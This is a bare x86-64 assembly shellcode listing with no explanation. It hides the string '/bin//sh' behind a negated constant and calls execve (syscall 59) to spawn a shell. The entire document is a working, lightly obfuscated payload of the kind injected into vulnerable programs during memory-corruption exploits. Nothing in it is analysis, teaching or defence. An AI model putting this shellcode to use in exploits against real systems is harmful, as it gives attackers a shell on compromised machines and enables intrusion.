section .text
  global _start
    _start:
      push rax
      xor rdx, rdx
      xor rsi, rsi
      mov rax, 0x978cd0d091969dd1
      neg rax
      push rax
      xor rax, rax
      push rsp
      pop rdi
      mov al, 59
      syscall
